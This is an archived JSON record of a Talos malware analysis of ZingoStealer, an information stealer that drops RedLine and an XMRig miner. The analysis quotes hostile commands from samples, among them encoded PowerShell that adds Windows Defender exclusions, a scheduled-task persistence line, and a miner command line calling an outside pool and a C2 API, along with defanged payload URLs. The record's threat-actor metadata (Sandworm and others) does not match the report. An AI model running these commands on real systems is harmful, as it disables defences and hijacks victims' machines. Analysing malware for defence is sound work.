{
    "id": "7b59744a-2ee0-41f2-b475-f56e9c5466a0",
    "created_at": "2023-01-12T15:09:40.952391Z",
    "updated_at": "2025-03-27T02:14:38.862115Z",
    "deleted_at": null,
    "sha1_hash": "f683370698e3c3048f2c392e7178e7fbaaf24a67",
    "title": "2022-04-14 - Threat Spotlight- -Haskers Gang- Introduces New ZingoStealer",
    "authors": "",
    "file_creation_date": "2022-05-27T21:58:49Z",
    "file_modification_date": "2022-05-27T21:58:49Z",
    "file_size": 4118947,
    "plain_text": "# Threat Spotlight: \"Haskers Gang\" Introduces New ZingoStealer\n\n**[blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html](https://blog.talosintelligence.com/2022/04/haskers-gang-zingostealer.html)**\n\n**Update (04/14/22): Following the initial publication of this blog, we observed a new post in**\nthe Haskers Gang Telegram channel announcing that ownership of the ZingoStealer project\nis being transferred to a new threat actor.\n\nWe also observed the malware author offering to sell the source code for ZingoStealer for\n$500 (negotiable).\n\n_[By Edmund Brumaghin and Vanja Svajcer with contributions from Michael Chen](https://twitter.com/b4n1shed)_\n\n\n-----\n\nCisco Talos recently observed a new information stealer, called \"ZingoStealer\" that has\nbeen released for free by a threat actor known as \"Haskers Gang.\"\nThis information stealer, first introduced to the wild in March 2022, is currently\nundergoing active development and multiple releases of new versions have been\nobserved recently.\nThe malware leverages Telegram chat features to facilitate malware executable build\ndelivery and data exfiltration.\nThe malware can exfiltrate sensitive information such as credentials, steal\ncryptocurrency wallet information, and mine cryptocurrency on victims' systems.\nWhile this stealer is freely available and can be used by multiple threat actors, we have\nobserved a focus on infecting Russian speaking victims under the guise of game\ncheats, key generators and pirated software, which likely indicates a current focus on\nhome users.\nThe threat actor \"Haskers Gang\" uses collaborative platforms such as Telegram and\nDiscord to distribute updates, share tooling and otherwise coordinate activities.\nIn many cases, ZingoStealer also delivers additional malware such as RedLine Stealer\nand the XMRig cryptocurrency mining malware to victims.\n\n## What is \"Haskers Gang?\"\n\nHaskers Gang is a crimeware-related threat actor group active since at least January 2020,\nconsisting of a small number of original members. Their activity ranges from developing\nmethods for stealing confidential information to cryptocurrency mining, remote access and\ndevelopment of so-called \"crypters\" to avoid detection of malware by security and antivirus\nsoftware.\n\nThe group operates a Telegram channel to collaborate with other members, collect logs from\nsystems infected with ZingoStealer and publish announcements related to ongoing\ndevelopment efforts. The group also operates a similar collaborative Discord server where\nnew tooling is often shared to enable members to launch more successful intrusions,\nimprove antivirus evasion capabilities and otherwise disseminate tactics, techniques and\nprocedures.\n\nThese communities consist of thousands of members and demonstrate that financially\nmotivated cybercrime is increasingly attractive to many people around the world. The core\nmembers of this crimeware group are likely located in Eastern Europe, and many of the\nannouncements and other communications are written in Russian.\n\n## Introduction to ZingoStealer\n\n\n-----\n\nIn early March 2022, while monitoring the communications between members of Haskers\nGang, we observed the announcement of the availability of a new information stealer called\n\"ZingoStealer.\" This new malware was advertised as being freely available to members of\nthe Haskers Gang Telegram community.\n\n_ZingoStealer release announcement._\n\nSince this announcement, we have observed a steady volume of ZingoStealer samples\nbeing uploaded to various malware repositories.\n\nThe malware is offered in two \"tiers\" of options, with both versions of the malware\nprecompiled and delivered via a Telegram channel.\n\n_ZingoStealer and exoCrypt crypter integration._\n\nFor 300 Rubles (~$3 USD), Haskers Gang also offers a pre-built option that leverages their\ncrypter, which they refer to as \"ExoCrypt.\" This allows affiliates to take advantage of antivirus\nevasion without requiring them to use a third-party builder to package the malware prior to\ndistributing it.\n\nDuring our analysis of ZingoStealer, we observed the malware author behind the stealer\nincorporating the XMRig cryptocurrency mining software into the stealer to further monetize\n\n\n-----\n\ntheir efforts by using systems infected by affiliates to generate Monero for the malware\nauthor.\n\n_Miner release announcement sent to the channel on March 18._\n\nWhile researching ZingoStealer, we observed additional functionality, cryptocurrency theft\nsupport, and other features added frequently, indicating that this threat will likely continue to\nevolve and mature over time.\n\n### Distribution campaigns\n\nAs this stealer is being made available for free to members of the Haskers Gang community,\nit is likely being leveraged by a variety of otherwise unrelated threat actors using various\ntechniques to infect potential victims. We have observed a steady volume of new samples in\nthe wild and expect that this trend will continue. In many cases, ZingoStealer is currently\nbeing distributed under the guise of game cheats, cracks and code generators. In one\nexample, the malware was being distributed under the guise of a game modification utility for\n\"Counter-Strike: Global Offensive.\" The threat actor posted a YouTube video demonstrating\nuse of a tool purported to mod the popular video game. The video description contained a\nlink to the tool hosted on Google Drive.\n\n\n-----\n\n_YouTube video description._\n\nThe hyperlink points to a password-protected RAR archive stored in Google Drive that\ncontains an executable called \"loader.exe.\" This executable is responsible for infecting the\nsystem with ZingoStealer.\n\n_Google Drive content._\n\nThe video itself was posted well before the initial announcement of the availability of\nZingoStealer, however, the modified date for the content hosted on Google Drive was March\n22, 2022. This indicates that the hyperlinks in the video descriptions may be updated over\ntime at the attacker's discretion.\n\nIn many cases, the ZingoStealer executable was observed being hosted on the Discord\nCDN, following naming conventions similar to the following examples:\n\n\n-----\n\n```\nhXXps://cdn[.]discordapp[.]com/attachments/960542241498210334/960544850158166027/2_535\nhxxps://cdn[.]discordapp[.]com/attachments/960542241498210334/960542756156100708/2_535\nhxxps://cdn[.]discordapp[.]com/attachments/941227101351215104/960556192931938304/loade\nhxxps://cdn[.]discordapp[.]com/attachments/810482847340429352/960156304029151302/Ginzo\n\n```\nThis may indicate threat actors are also distributing the malware within gaming-related\nDiscord servers under the guise of video game cheats.\n\n### Other Haskers Gang campaigns\n\nIn another example, we observed a threat actor posting a YouTube video purporting to be a\nway to obtain free plugins for Adobe applications.\n\n_Haskers Gang video announcement._\n\nThe video description contained a link to a supposed tool which used the Bitly URLshortening service. When clicked, the victim is redirected to a password-protected ZIP\narchive containing a malicious Windows executable hosted on the Mega[.]nz file-sharing\nwebsite. The executable is packed and drops the RedLine information stealer on victims'\nsystems.\n\nThe threat actor behind this distribution campaign also invited members of the Haskers Gang\nTelegram channel to post positive comments in English to add legitimacy to the video and\nassociated hyperlinks.\n\n\n-----\n\nThis is a secondary payload we ve frequently observed coinciding with ZingoStealer\ninfections. In many cases, ZingoStealer retrieves a list of URLs hosted on the C2 server as\n\"ginzolist.txt.\" The malware then attempts to retrieve the payloads hosted at these URLs, one\nof the most common being RedLine. We've also frequently observed XMRig being delivered\nto systems infected with ZingoStealer.\n\n## ZingoStealer execution\n\nThe stealer is an obfuscated .NET executable. When executed on victim systems, it attempts\nto retrieve various .NET dependencies that provide core functionality used by the malware\nfrom an attacker-controlled server. The dependencies retrieved by the malware include:\n\nBouncyCastle.Crypto\nDotNetZip\nNewtonSoft.Json\nSQLite.Interop (For both x86 and x64)\nSystem.Data.SQLite\n\n_.NET component retrieval._\n\nThe retrieved DLL files are then stored in the directory from which the malware is currently\nrunning. In the case of SQLite.Interop.dll, the malware retrieves the x86 and x64 versions\nand creates a subdirectory for each architecture before storing the retrieved binaries.\n\n_.NET component directory._\n\nThe stealer then creates a directory structure which is used to collect and save sensitive\ninformation that is later exfiltrated to the attacker. The location for this directory structure is:\n```\nC:\\Users\\<USERNAME>\\AppData\\Local\\GinzoFolder\n\n```\n\n-----\n\nWithin this directory, the malware creates subfolders to store various types of information that\nis collected by the malware. These subdirectories include:\n\nBrowsers\nWallets\nDesktop Files\n\nZingoStealer then begins the system enumeration and data collection process, starting by\ntaking a screenshot of the victim's system and storing it as a PNG called \"Screenshot.PNG\"\nwithin the directory that was created earlier.\n\nNext the malware begins to identify and collect sensitive information stored by web browsers\ninstalled on the system. This includes saved local data, cookies, login data, etc.\n\nIt supports the major web browsers, including:\n\nGoogle Chrome\nMozilla Firefox\nOpera\nOpera GX\n\nDiscovered information is saved within the directory structure we described previously.\n\nThe malware also attempts to enumerate environmental and system information. This data is\nsaved within a text file called \"system.txt\" which is also stored within the data staging\ndirectory and includes:\n\nIP address\nComputer name\nUsername\nOS version\nLocalization information\nProcessor information\nSystem memory\nScreen resolution\nStart time\n\nNext, ZingoStealer attempts to collect sensitive information, including user account tokens\nfor collaboration software that may be installed, including Discord and Telegram. As\n[mentioned in our previous research related to abuse of collaboration platforms, this](https://blog.talosintelligence.com/2021/04/collab-app-abuse.html)\ninformation can be used to impersonate users, obtain victim account information, or\notherwise abuse these platforms and their users. ZingoStealer also attempts to access\ninformation related to Chrome extensions that may be present within the victim's web\nbrowser. This information is gathered from the following location:\n\n\n-----\n\n```\nC:\\Users\\<USERNAME>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension\nSettings\\<CHROME_EXTENSION_ID>\n\n```\nThe malware specifically searches for extension data associated with the following\ncryptocurrency wallet extensions.\n\nTronLink\nNifty Wallet\nMetaMask\nMathWallet\nCoinbase Wallet\nBinance Wallet\nBrave Wallet\nGuarda\nEQUAL Wallet\nBitApp Wallet\niWallet\nWombat - Gaming Wallet\n\nZingoStealer then searches %APPDATA%\\Local and %APPDATA%\\Roaming for\ncryptocurrency wallet data associated with the following cryptocurrencies.\n\nZcash\nArmory\nBytecoin\nJaxx Liberty\nExodus\nEthereum\nElectrum\nAtomic\nGuarda\nCoinomi\n\nIt also queries the registry (HKCU\\SOFTWARE\\<VALUE>) to identify settings associated\nwith additional cryptocurrency wallets, including:\n\nBitcoin\nDash\nLitecoin\n\nAny files or directories present within the infected user's Desktop folder will also be copied to\nthe staging directory. Any data successfully collected throughout this process will be stored in\nthe appropriate subdirectory within the data staging directory. Once the collection process\nhas been completed, DotNetZip creates an archive containing all the information, which is\nthen exfiltrated to an attacker-controlled server.\n\n\n-----\n\n_Data exfiltration._\n\nThe logs are then processed and delivered to the Haskers Gang Telegram channel so\nZingoStealer users can access them.\n\n_Log delivery via Telegram._\n\nThe malware is also used as a loader for other malware payloads.\n\nDuring the execution of the ZingoStealer payload, it retrieves the geolocation of the victim's\nsystem using freegeoip[.]app. It then makes an HTTP GET request to the C2 server for a\nresource called \"cis.txt.\" An example of this can be seen below.\n\n\n-----\n\n_CIS check._\n\nThis could be a reference to the Commonwealth of Independent States (CIS). Many\nfinancially motivated cybercriminals located in CIS countries actively avoid infecting systems\nin these countries to avoid attracting local law enforcement attention. Similar behavior is\noften observed, as ransomware operators often actively avoid targeting organizations\nlocated in these countries. In one of the initial announcements related to ZingoStealer, the\nmalware author mentioned that, while CIS filtering is available, it is not currently in place, but\nit may be activated in the future based on local law enforcement attention.\n\nFollowing the geolocation check, the malware requests a list of URLs that it uses to retrieve\nand execute additional malware payloads, at the discretion of the attacker.\n\n_Secondary payload list retrieval._\n\nThis list of URLs is saved into a text file called \"ginzolist.txt\" that is saved within the\n%APPDATA%\\Local directory on the victim system. The malware then retrieves the\nadditional malware payloads hosted at these URLs and saves them within the\n%APPDATA%\\Local directory. An example of this can be seen below.\n\n\n-----\n\n_Secondary payload binary retrieval._\n\nIn this particular case, the binary \"sweet.exe\" was associated with RedLine Stealer and\nsaved at C:\\Users\\<USERNAME>\\AppData\\Local\\536075.exe.\n\nWhile \"antiwm.exe\" was associated with an injector for the XMRig cryptocurrency miner and\nsaved at C:\\Users\\<USERNAME>\\AppData\\Local\\209625.exe.\n\nThe retrieved binary payloads then continue the infection process.\n\n## ExoCrypt crypter\n\nAs previously mentioned, the malware author responsible for ZingoStealer also offers a\ncrypter service that allows ZingoStealer users to obtain encrypted ZingoStealer builds that\nassist with evading endpoint detection on systems. We identified a binary loader for\nZingoStealer that may be related to the use of this crypter.\n\n_Sample metadata._\n\nThe functionality of the code is straightforward: It is responsible for implementing a\nrandomized sleep interval before decrypting the contents of the ZingoStealer binary and\nsaving the decrypted contents as %TEMP%\\ChromeHandler.exe. It then executes the\nZingoStealer binary, initiating the normal infection process previously described.\n\n\n-----\n\n_Main() function._\n\nTo decrypt the ZingoStealer binary, it retrieves the data from a resource present within the\nexecutable called \"zvezdy\" and stores it within an array.\n\n_Zvezdy resource contents._\n\nIt then iterates through the array and performs a modulo operation on each of the values.\nBased on the results of the operation, each byte is converted into the appropriate value and\nstored within a second array. An example of the Decryption() function is shown below.\n\n_Decryption() function._\n\n\n-----\n\nFinally, the second array is passed back to the Main() function, saved to disk as\nZingoStealer, and executed to continue the infection process.\n\n## RedLine Stealer\n\n[One of the secondary payloads delivered and executed by ZingoStealer is RedLine Stealer,](https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer)\na well-known information stealer that has been analyzed extensively over the past couple of\nyears. It features significantly more support for retrieving data from various applications,\nbrowsers, cryptocurrency wallets and extensions. Below is a basic comparison between the\ntwo stealers as it relates to supported applications from which the malware can retrieve\nsensitive data to be exfiltrated to the attacker.\n\n\n-----\n\n_Stealer feature comparison._\n\nGiven that RedLine Stealer seems to provide more capabilities, why would an adversary use\nZingoStealer to deliver RedLine Stealer?\n\n\n-----\n\nBesides ZingoStealer, the malware author also offers additional services that they advertise\nwithin the Haskers Gang community. One service is a \"log access service\" used to monetize\ninformation stealer logs obtained from previously infected systems. Customers can purchase\naccess to the log data generated from various stealers operated by the attacker, which\nprovides them sensitive account information that can be further leveraged for a variety of\npurposes including initial access, fraud, etc.\n\n_Advertisement for the logging service._\n\nThe malware author behind ZingoStealer assures ZingoStealer users that they do not access\nlog data generated by ZingoStealer.\n\n_Actor's assurance they do not take interest in the uploaded stolen logs._\n\nHowever, by effectively backdooring ZingoStealer and using it to deliver RedLine Stealer,\nthey can still take advantage of the infections achieved by ZingoStealer users. This allows\nthem to let ZingoStealer users perform the heavy lifting in terms of malware distribution,\nantivirus evasion, and achieving successful infections, while they passively collect more\ncomprehensive logs from the systems. This also allows them to monetize the infections of all\nZingoStealer users simultaneously, maximizing profitability.\n\nThe RedLine Stealer configuration extracted from analyzed samples contained the following\nparameters.\n```\n{\"ip\": \"193[.]38[.]235[.]228:45347\", \"xor_key\": \"Zag\", \"id\": \"keepye\"}\n\n```\nThe value \"keepye\" stored within the ID field of the configuration matches the username\nassociated with an individual suspected to be behind development of ZingoStealer.\n\n\n-----\n\n_Threat actor social media profile._\n\n## ZingoMiner (XMRig)\n\nIn addition to RedLine Stealer, ZingoStealer also delivers the XMRig cryptocurrency mining\nmalware to victims. This is another way the malware author behind ZingoStealer is\nattempting to monetize the operations of ZingoStealer users.\n\nThis was confirmed when the author of ZingoStealer published an announcement within the\nHaskers Gang Telegram group informing the community that they had added XMRig to a\nnew version of ZingoStealer as previously described.\n\nAs mentioned, the main binary payload associated with the mining malware is retrieved and\nexecuted by ZingoStealer during the initial infection process. It is then executed using\nconhost.exe as shown below.\n```\n\"C:\\Windows\\System32\\conhost.exe\" \"C:\\Users\\<USERNAME>\\AppData\\Local\\209625.exe\"\n\n```\nOnce executed, it invokes PowerShell using the EncodedCommand option, specifying\nBase64-encoded PowerShell commands to execute.\n```\ncmd /c powershell -EncodedCommand\n\"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgA\n & powershell -EncodedCommand\n\"QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuA\n & exit\"\n\n```\nThis PowerShell is responsible for creating two exclusions in the Windows Defender\nconfiguration on the system.\n\n\n-----\n\n```\nAdd MpPreference ExclusionPath @($env:UserProfile,$env:SystemDrive) Force\nAdd-MpPreference -ExclusionExtension @('exe','dll') -Force\n\n```\nIt also attempts to achieve persistence for the miner, ensuring that it is executed following\nsystem reboots. This is accomplished by creating a new scheduled task using the following\nsyntax:\n```\nschtasks /create /f /sc onlogon /rl highest /tn \"updater\" /tr \"C:\\Users\\\n<USERNAME>\\AppData\\Roaming\\Chrome\\updater.exe\"\n\n```\nFinally, the malware copies itself from its initial starting location to match the path defined in\nthe scheduled task, and then executes the newly created executable.\n```\n\"C:\\Windows\\System32\\conhost.exe\" \"C:\\Users\\\n<USERNAME>\\AppData\\Roaming\\Chrome\\updater.exe\"\n\n```\nThis executable is also responsible for creating and executing a binary located at:\n```\nC:\\Users\\<USERNAME>\\AppData\\Roaming\\Windows\\Telemetry\\sihost64.exe\n\n```\nIt also creates a file at the following location:\n```\nC:\\Users\\<USERNAME>\\AppData\\Roaming\\Windows\\Libs\\WR64.sys\n\n```\nFinally, it invokes explorer.exe with the following parameters.\n```\nC:\\Windows\\explorer.exe shpiczjxwdufjl0\nXji3FXYfqqI2timPThbgZueMNpSES88mLhMz2ywydJRha9S4YJkR8/KlqFio/vzAY7y//ZROYnArPXLiffwPB7\n\n```\nThis injects XMRig into the explorer.exe process and begins the cryptocurrency mining\noperations. The XMRig client is launched with the following command line parameters:\n```\n\\Windows\\explorer.exe --algo=rx/0 --randomx-no-rdmsr --url=pool[.]hashvault[.]pro:80\n-user=47tAzTKZcJuCui5Bx2FPVoA7UvWoz1QvRCFF1Bpvej5yGJuPPBgqTC8NG95Q3sMwsYV34eonCD3RVSEpS\n --pass= --cpu-max-threads-hint=30 --cinit-stealthtargets=\"Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe\" -cinit-api=\"hxxps://control[.]nominally[.]ru/api/endpoint.php\" --tls --cinit-idlewait=5 --cinit-idle-cpu=90\n\n```\nInfected systems periodically send beacon data to the API specified when XMRig was\nlaunched. These beacons are consistent with the following example:\n```\n{\"computername\":\"<HOSTNAME>\",\"username\":\"<HOSTNAME>\",\"gpu\":\"\n<REDACTED>\",\"remoteconfig\":\"\",\"type\":\"xmrig\",\"status\":4,\"uqhash\":\"<REDACTED>\"}\n\n```\nInvestigating the pool address specified by the malware shows that the hash rate has\ncontinued to increase as more systems are infected with ZingoStealer, however it has not\nproven to be very lucrative thus far.\n\n\n-----\n\n_Mining Pool Statistics_\n\n## Conclusion\n\nZingoStealer is a relatively new information stealer being offered for free to members of the\nHaskers Gang Telegram group. It features the ability to steal sensitive information from\nvictims and can download additional malware to infected systems. In many cases, this\nincludes the RedLine Stealer and an XMRig-based cryptocurrency mining malware that is\ninternally referred to as \"ZingoMiner.\" While the malware is new, Cisco Talos has observed\nthat it is undergoing consistent development and improvement and that the volume of new\nsamples being observed in the wild continues to increase as more threat actors attempt to\nleverage it for nefarious purposes. In many of the distribution campaigns we have observed\nassociated with ZingoStealer, threat actors appear to be targeting home users and\ndistributing their malware under the guise of video game cracks, cheats, and other similar\ncontent. Users should be aware of the threats posed by these types of applications and\nshould ensure that they are only executing applications distributed via legitimate\nmechanisms.\n\n## Coverage\n\n\n-----\n\nWays our customers can detect and block this threat are listed below.\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[execution of the malware detailed in this post. Try Secure Endpoint for free here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Damp-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Damp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\ndetects malware used in these attacks.\n\n[Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by](https://www.cisco.com/c/en/us/products/security/email-security/index.html)\nthreat actors as part of their campaign. You can try Secure Email for free [here.](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium%3Dweb-referral%26utm_source%3Dcisco%26utm_campaign%3Dcmd-free-trial-request%26utm_term%3Dpgm-talos-trial)\n\n[Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\nsuch as [Threat Defense Virtual,](https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html) [Adaptive Security Appliance and](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) [Meraki MX can detect](https://meraki.cisco.com/products/appliances)\nmalicious activity associated with this threat.\n\n[Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\nprotection into all Cisco Secure products.\n\n[Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs and URLs, whether users are on or off the corporate network. Sign up for a\n[free trial of Umbrella here.](https://signup.umbrella.com/?utm_medium%3Dweb-referral?utm_source%3Dcisco%26utm_campaign%3Dumbrella-free-trial%26utm_term%3Dpgm-talos-trial%26utm_content%3Dautomated-free-trial)\n\n[Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\npotentially dangerous sites and tests suspicious sites before users access them.\n\nAdditional protections with context to your specific environment and threat data are available\nfrom the [Firewall Management Center.](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html)\n\n\n-----\n\n[Cisco Duo provides multi-factor authentication for users to ensure only those authorized are](https://signup.duo.com/?utm_source%3Dtalos%26utm_medium%3Dreferral%26utm_campaign%3Dduo-free-trial)\naccessing your network.\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\nThe following Snort SIDs are applicable to this threat: 59145, 59160, 59500 and 59501.\n\n**Orbital Queries**\n\n[Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to](https://orbital.amp.cisco.com/help/)\nsee if their endpoints are infected with this specific threat. For specific OSqueries on this\nthreat, click [here and](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/zingo_infostealer_file_artifact.yaml) [here.](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/malware_redline_infostealer_directory.yaml)\n\n## Indicators of Compromise\n\n[Indicators of Compromise associated with this threat can be found here.](https://talosintelligence.com/resources/415)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-14 - Threat Spotlight- -Haskers Gang- Introduces New ZingoStealer.pdf"
    ],
    "report_names": [
        "2022-04-14 - Threat Spotlight- -Haskers Gang- Introduces New ZingoStealer.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536180,
    "ts_updated_at": 1743041678,
    "ts_creation_date": 1653688729,
    "ts_modification_date": 1653688729,
    "files": {
        "pdf": "https://archive.orkl.eu/f683370698e3c3048f2c392e7178e7fbaaf24a67.pdf",
        "text": "https://archive.orkl.eu/f683370698e3c3048f2c392e7178e7fbaaf24a67.txt",
        "img": "https://archive.orkl.eu/f683370698e3c3048f2c392e7178e7fbaaf24a67.jpg"
    }
}